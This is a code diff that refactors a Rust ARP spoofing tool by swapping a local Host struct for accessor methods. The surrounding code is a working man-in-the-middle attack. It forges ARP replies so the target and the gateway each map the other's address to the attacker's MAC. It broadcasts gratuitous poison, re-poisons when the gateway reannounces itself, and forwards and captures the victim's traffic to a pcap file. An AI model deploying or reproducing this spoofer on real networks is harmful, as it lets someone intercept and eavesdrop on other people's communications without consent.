@@ -8,18 +8,12 @@ use tokio::{io, signal, time};
 
 use crate::arp::{self, ArpFrame, ArpOpCode, ArpPacket};
 use crate::net::{
-    DataLinkFrame, DataLinkHeader, DataLinkReceiver, DataLinkSender, DataLinkSocket, MacAddr,
+    DataLinkFrame, DataLinkHeader, DataLinkReceiver, DataLinkSender, DataLinkSocket, Host, MacAddr,
     PcapWriter, read_ipv4,
 };
 
 /// Delay between packets of the initial burst.
 const BURST_INTERVAL: Duration = Duration::from_millis(20);
-
-#[derive(Clone, Copy)]
-struct Host {
-    ip: Ipv4Addr,
-    mac: MacAddr,
-}
 
 /// Writes a frame to the capture file, logging instead of propagating errors,
 /// so an I/O failure on the dump does not kill the spoofer.
@@ -42,10 +36,7 @@ fn spoofer_host(iface: &str) -> io::Result<Host> {
 
     println!("Our IPv4 address: {our_ip}");
 
-    Ok(Host {
-        ip: our_ip,
-        mac: our_mac,
-    })
+    Ok(Host::new(our_ip, our_mac))
 }
 
 #[allow(clippy::too_many_arguments)]
@@ -78,19 +69,13 @@ pub(super) async fn run(
 
     // Attempt to resolve the gateway MAC, and make gateway Host
     let gateway: Host = match gateway_mac {
-        Some(mac) => Host {
-            ip: gateway_ip,
-            mac,
-        },
+        Some(mac) => Host::new(gateway_ip, mac),
         None => {
             println!("Resolving gateway MAC address...");
-            match arp::resolve_mac(&tx, &mut rx, spoofer.mac, spoofer.ip, gateway_ip).await? {
+            match arp::resolve_mac(&tx, &mut rx, spoofer, gateway_ip).await? {
                 Some(mac) => {
                     println!("Gateway MAC address: {mac}");
-                    Host {
-                        ip: gateway_ip,
-                        mac,
-                    }
+                    Host::new(gateway_ip, mac)
                 }
                 None => {
                     return Err(io::Error::other("Failed to resolve gateway MAC address"));
@@ -104,18 +89,15 @@ pub(super) async fn run(
         Some(target_ip) => match target_mac {
             Some(mac) => {
                 table.insert(target_ip, mac);
-                Some(Host { ip: target_ip, mac })
+                Some(Host::new(target_ip, mac))
             }
             None => {
                 println!("Resolving target MAC address...");
-                match arp::resolve_mac(&tx, &mut rx, spoofer.mac, spoofer.ip, target_ip).await? {
+                match arp::resolve_mac(&tx, &mut rx, spoofer, target_ip).await? {
                     Some(target_mac) => {
                         println!("Target MAC address: {target_mac}");
                         table.insert(target_ip, target_mac);
-                        Some(Host {
-                            ip: target_ip,
-                            mac: target_mac,
-                        })
+                        Some(Host::new(target_ip, target_mac))
                     }
                     None => {
                         // The target IP is explicitly set, so if we can't resolve the MAC, the spoofing should not start.
@@ -151,27 +133,27 @@ fn make_poison_frames(spoofer: Host, gateway: Host, target: Option<Host>) -> Vec
 
             // Target: the gateway is at our MAC
             let to_target = DataLinkFrame {
-                eth_dst: target.mac,
-                eth_src: spoofer.mac,
+                eth_dst: target.mac(),
+                eth_src: spoofer.mac(),
                 payload: ArpPacket {
                     opcode: ArpOpCode::Reply,
-                    sender_mac: spoofer.mac,
-                    sender_ip: gateway.ip,
-                    target_mac: target.mac,
-                    target_ip: target.ip,
+                    sender_mac: spoofer.mac(),
+                    sender_ip: gateway.ip(),
+                    target_mac: target.mac(),
+                    target_ip: target.ip(),
                 },
             };
 
             // Gateway: the target is at our MAC
             let to_gateway = DataLinkFrame {
-                eth_dst: gateway.mac,
-                eth_src: spoofer.mac,
+                eth_dst: gateway.mac(),
+                eth_src: spoofer.mac(),
                 payload: ArpPacket {
                     opcode: ArpOpCode::Reply,
-                    sender_mac: spoofer.mac,
-                    sender_ip: target.ip,
-                    target_mac: gateway.mac,
-                    target_ip: gateway.ip,
+                    sender_mac: spoofer.mac(),
+                    sender_ip: target.ip(),
+                    target_mac: gateway.mac(),
+                    target_ip: gateway.ip(),
                 },
             };
 
@@ -183,13 +165,13 @@ fn make_poison_frames(spoofer: Host, gateway: Host, target: Option<Host>) -> Vec
             // using a gratuitous-style frame (sender IP == target IP == gateway)
             let reply = DataLinkFrame {
                 eth_dst: MacAddr::BROADCAST,
-                eth_src: spoofer.mac,
+                eth_src: spoofer.mac(),
                 payload: ArpPacket {
                     opcode: ArpOpCode::Reply,
-                    sender_mac: spoofer.mac,
-                    sender_ip: gateway.ip,
+                    sender_mac: spoofer.mac(),
+                    sender_ip: gateway.ip(),
                     target_mac: MacAddr::BROADCAST,
-                    target_ip: gateway.ip,
+                    target_ip: gateway.ip(),
                 },
             };
 
@@ -211,31 +193,31 @@ fn make_unicast_poison_frames(
     let mut poisons: Vec<Bytes> = Vec::new();
 
     for (host_ip, host_mac) in table.iter() {
-        if *host_ip == gateway.ip {
+        if *host_ip == gateway.ip() {
             continue;
         }
 
         let to_host = DataLinkFrame {
             eth_dst: *host_mac,
-            eth_src: spoofer.mac,
+            eth_src: spoofer.mac(),
             payload: ArpPacket {
                 opcode: ArpOpCode::Reply,
-                sender_mac: spoofer.mac,
-                sender_ip: gateway.ip,
+                sender_mac: spoofer.mac(),
+                sender_ip: gateway.ip(),
                 target_mac: *host_mac,
                 target_ip: *host_ip,
             },
         };
 
         let to_gateway = DataLinkFrame {
-            eth_dst: gateway.mac,
-            eth_src: spoofer.mac,
+            eth_dst: gateway.mac(),
+            eth_src: spoofer.mac(),
             payload: ArpPacket {
                 opcode: ArpOpCode::Reply,
-                sender_mac: spoofer.mac,
+                sender_mac: spoofer.mac(),
                 sender_ip: *host_ip,
-                target_mac: gateway.mac,
-                target_ip: gateway.ip,
+                target_mac: gateway.mac(),
+                target_ip: gateway.ip(),
             },
         };
 
@@ -338,14 +320,14 @@ async fn handle_arp(
     dump: &mut Option<PcapWriter>,
 ) -> io::Result<()> {
     // Discard our own packets
-    if arp.eth_src == spoofer.mac {
+    if arp.eth_src == spoofer.mac() {
         println!("Received packet from our own MAC address");
         return Ok(());
     }
 
     // The gateway reannounced an IP that we impersonate.
     // Immediately poison again without waiting for the tick
-    if arp.is_gratuitous() && arp.sender_ip == gateway.ip {
+    if arp.is_gratuitous() && arp.sender_ip == gateway.ip() {
         println!("Gateway reannounced an IP that we impersonate, spoofing again");
         dump_frame(dump, frame).await;
 
@@ -360,7 +342,7 @@ async fn handle_arp(
         return Ok(());
     }
 
-    if arp.sender_mac != spoofer.mac
+    if arp.sender_mac != spoofer.mac()
         && !arp.sender_mac.is_broadcast()
         && !arp.sender_mac.is_unspecified()
     {
@@ -375,18 +357,18 @@ async fn handle_arp(
             // so its cache gets poisoned before the gateway can reply.
             // In targeted mode, only answer to the target, so no other
             // host's cache gets poisoned.
-            let is_target: bool = target.is_none_or(|t| arp.eth_src == t.mac);
+            let is_target: bool = target.is_none_or(|t| arp.eth_src == t.mac());
 
-            if arp.target_ip == gateway.ip && is_target {
+            if arp.target_ip == gateway.ip() && is_target {
                 dump_frame(dump, frame).await;
 
                 let response = DataLinkFrame {
                     eth_dst: arp.eth_src,
-                    eth_src: spoofer.mac,
+                    eth_src: spoofer.mac(),
                     payload: ArpPacket {
                         opcode: ArpOpCode::Reply,
-                        sender_mac: spoofer.mac,
-                        sender_ip: gateway.ip,
+                        sender_mac: spoofer.mac(),
+                        sender_ip: gateway.ip(),
                         target_mac: arp.eth_src,
                         target_ip: arp.sender_ip,
                     },
@@ -425,12 +407,12 @@ async fn handle_ipv4_packet_forward(
     }
 
     // Skip packets destined for our MAC address
-    if dhl.eth_dst != spoofer.mac {
+    if dhl.eth_dst != spoofer.mac() {
         return Ok(());
     }
 
     // Skip our own frames echoed back by the socket
-    if dhl.eth_src == spoofer.mac {
+    if dhl.eth_src == spoofer.mac() {
         return Ok(());
     }
 
@@ -438,18 +420,18 @@ async fn handle_ipv4_packet_forward(
     let dst_ip: Ipv4Addr = Ipv4Addr::new(frame[30], frame[31], frame[32], frame[33]);
 
     // Skip packets addressed to us: they are for the local stack, not to forward
-    if dst_ip == spoofer.ip {
+    if dst_ip == spoofer.ip() {
         return Ok(());
     }
 
-    if dhl.eth_src == gateway.mac {
+    if dhl.eth_src == gateway.mac() {
         // gateway to target (look in the ARP table)
         match table.get(&dst_ip) {
-            Some(victim_mac) => rewrite_mac_addrs(&mut frame, *victim_mac, spoofer.mac),
+            Some(victim_mac) => rewrite_mac_addrs(&mut frame, *victim_mac, spoofer.mac()),
             None => return Ok(()), // Target not yet seen (trigger ARP request?)
         }
     } else {
-        rewrite_mac_addrs(&mut frame, gateway.mac, spoofer.mac);
+        rewrite_mac_addrs(&mut frame, gateway.mac(), spoofer.mac());
     }
 
     // TODO: allow forwarding the traffic to other tools
@@ -478,13 +460,13 @@ async fn restore_arp(
     dump: &mut Option<PcapWriter>,
 ) -> io::Result<()> {
     // Restore gateway -> target
-    restore_target_arp(tx, table, spoofer.mac, gateway, burst, dump).await?;
+    restore_target_arp(tx, table, spoofer.mac(), gateway, burst, dump).await?;
 
     // Restore target -> gateway
-    restore_gateway_arp(tx, table, spoofer.mac, gateway, burst, dump).await?;
+    restore_gateway_arp(tx, table, spoofer.mac(), gateway, burst, dump).await?;
 
     // Restore all others
-    restore_broadcast_arp(tx, spoofer.mac, gateway, burst, dump).await?;
+    restore_broadcast_arp(tx, spoofer.mac(), gateway, burst, dump).await?;
 
     Ok(())
 }
@@ -500,7 +482,7 @@ async fn restore_target_arp(
     println!("Restoring ARP for gateway -> target...");
 
     for (target_ip, target_mac) in table.iter() {
-        if *target_ip == gateway.ip {
+        if *target_ip == gateway.ip() {
             continue;
         }
 
@@ -509,8 +491,8 @@ async fn restore_target_arp(
             eth_src: our_mac,
             payload: ArpPacket {
                 opcode: ArpOpCode::Reply,
-                sender_mac: gateway.mac,
-                sender_ip: gateway.ip,
+                sender_mac: gateway.mac(),
+                sender_ip: gateway.ip(),
                 target_mac: *target_mac,
                 target_ip: *target_ip,
             },
@@ -524,7 +506,7 @@ async fn restore_target_arp(
             time::sleep(BURST_INTERVAL).await;
         }
 
-        println!("Restored ARP for {} -> {target_ip}.", gateway.ip);
+        println!("Restored ARP for {} -> {target_ip}.", gateway.ip());
     }
 
     Ok(())
@@ -542,19 +524,19 @@ async fn restore_gateway_arp(
 
     for (target_ip, target_mac) in table.iter() {
         // Skip the gateway itself
-        if *target_ip == gateway.ip {
+        if *target_ip == gateway.ip() {
             continue;
         }
 
         let reply = DataLinkFrame {
-            eth_dst: gateway.mac,
+            eth_dst: gateway.mac(),
             eth_src: our_mac,
             payload: ArpPacket {
                 opcode: ArpOpCode::Reply,
                 sender_mac: *target_mac,
                 sender_ip: *target_ip,
-                target_mac: gateway.mac,
-                target_ip: gateway.ip,
+                target_mac: gateway.mac(),
+                target_ip: gateway.ip(),
             },
         };
 
@@ -566,7 +548,7 @@ async fn restore_gateway_arp(
             time::sleep(BURST_INTERVAL).await;
         }
 
-        println!("Restored ARP for {target_ip} -> {}.", gateway.ip);
+        println!("Restored ARP for {target_ip} -> {}.", gateway.ip());
     }
 
     Ok(())
@@ -586,10 +568,10 @@ async fn restore_broadcast_arp(
         eth_src: our_mac,
         payload: ArpPacket {
             opcode: ArpOpCode::Reply,
-            sender_mac: gateway.mac,
-            sender_ip: gateway.ip,
-            target_mac: gateway.mac,
-            target_ip: gateway.ip,
+            sender_mac: gateway.mac(),
+            sender_ip: gateway.ip(),
+            target_mac: gateway.mac(),
+            target_ip: gateway.ip(),
         },
     };
 
